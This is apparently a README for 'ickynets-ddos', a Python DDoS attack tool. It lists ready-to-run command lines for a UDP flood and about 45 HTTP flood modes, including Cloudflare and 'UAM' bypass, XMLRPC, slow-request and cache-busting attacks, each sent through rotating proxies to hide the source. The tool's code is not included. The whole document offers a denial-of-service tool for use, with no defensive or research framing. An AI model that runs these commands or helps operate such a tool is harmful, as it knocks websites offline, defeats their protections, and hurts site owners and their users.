<center><a href="https://ibb.co/yS4sxZW"><img src="https://i.ibb.co/yS4sxZW/maxresdefault.jpg" alt="maxresdefault" border="0"></a></center>

<h1 align="center">ickynets-ddos - DDoS Attack Script</h1>
<em><h5 align="center">(Programming Language - Python 3)</h5></em>

#still in progress

💡 Example 1: Layer 4 Attack (UDP)

python3 main.py UDP 192.168.1.100 80 50 --duration 30

This launches a UDP flood on IP 192.168.1.100, port 80, with 50 threads for 30 seconds.

💡 Example 2: Layer 7 Attack (GET) with Proxy

python3 main.py GET example.com 80 100 --duration 60 --use-proxy

This sends HTTP GET requests to http://example.com:80 using 100 threads for 60 seconds, rotating through proxies from proxies.txt.

python3 main.py GET example.com 80 100 --duration 60 --use-proxy
python3 main.py POST example.com 443 80 --duration 45 --use-proxy
python3 main.py OVH example.com 80 100 --duration 90 --use-proxy
python3 main.py RHEX example.com 443 70 --duration 60 --use-proxy
python3 main.py OVH-STOMP example.com 443 70 --duration 60 --use-proxy
python3 main.py STRESS example.com 80 60 --duration 45 --use-proxy
python3 main.py DYN example.com 443 50 --duration 50 --use-proxy
python3 main.py DOWNLOADER example.com 443 30 --duration 90 --use-proxy
python3 main.py SLOW example.com 443 40 --duration 120 --use-proxy
python3 main.py HEAD example.com 80 50 --duration 60 --use-proxy
python3 main.py NULL example.com 80 70 --duration 60 --use-proxy
python3 main.py COOKIE example.com 443 75 --duration 90 --use-proxy
python3 main.py PPS example.com 443 60 --duration 30 --use-proxy
python3 main.py EVEN example.com 443 100 --duration 45 --use-proxy
python3 main.py GSB example.com 443 100 --duration 30 --use-proxy
python3 main.py DGB example.com 443 100 --duration 60 --use-proxy
python3 main.py AVB example.com 443 100 --duration 30 --use-proxy
python3 main.py BOT example.com 443 80 --duration 60 --use-proxy
python3 main.py APACHE example.com 443 80 --duration 120 --use-proxy
python3 main.py XMLRPC example.com 443 100 --duration 60 --use-proxy
python3 main.py CFB example.com 443 100 --duration 45 --use-proxy
python3 main.py CFBUAM example.com 443 70 --duration 60 --use-proxy
python3 main.py BYPASS example.com 443 80 --duration 90 --use-proxy
python3 main.py BOMB example.com 443 70 --duration 45 --use-proxy
python3 main.py KILLER example.com 443 60 --duration 60 --use-proxy
python3 main.py TOR example.com 443 40 --duration 60 --use-proxy
python3 main.py CF-BYPASS example.com 443 100 --duration 90 --use-proxy
python3 main.py DDOS example.com 443 100 --duration 60 --use-proxy
python3 main.py XBOMB example.com 443 80 --duration 60 --use-proxy
python3 main.py JUNK example.com 443 100 --duration 30 --use-proxy
python3 main.py BIGUA example.com 443 90 --duration 60 --use-proxy
python3 main.py CACHEBUSTER example.com 443 100 --duration 45 --use-proxy
python3 main.py RNDQUERY example.com 443 80 --duration 60 --use-proxy
python3 main.py POSTSPAM example.com 443 100 --duration 90 --use-proxy
python3 main.py INVALIDHDR example.com 443 70 --duration 60 --use-proxy
python3 main.py BROWSERMIX example.com 443 80 --duration 45 --use-proxy
python3 main.py PATHBOMB example.com 443 90 --duration 60 --use-proxy
python3 main.py MIXEDMETHOD example.com 443 80 --duration 75 --use-proxy
python3 main.py REFERERSPAM example.com 443 100 --duration 90 --use-proxy
python3 main.py CUSTOMHDRBOMB example.com 443 100 --duration 60 --use-proxy
python3 main.py JSONSPAM example.com 443 100 --duration 45 --use-proxy
python3 main.py UAFLOOD example.com 443 100 --duration 60 --use-proxy
python3 main.py METHODFUZZ example.com 443 90 --duration 60 --use-proxy
python3 main.py RANDENCODING example.com 443 80 --duration 60 --use-proxy
python3 main.py RANGESPLIT example.com 443 100 --duration 75 --use-proxy
python3 main.py ACCEPTOVERLOAD example.com 443 70 --duration 90 --use-proxy



pip install requests[socks]
pip install httpx
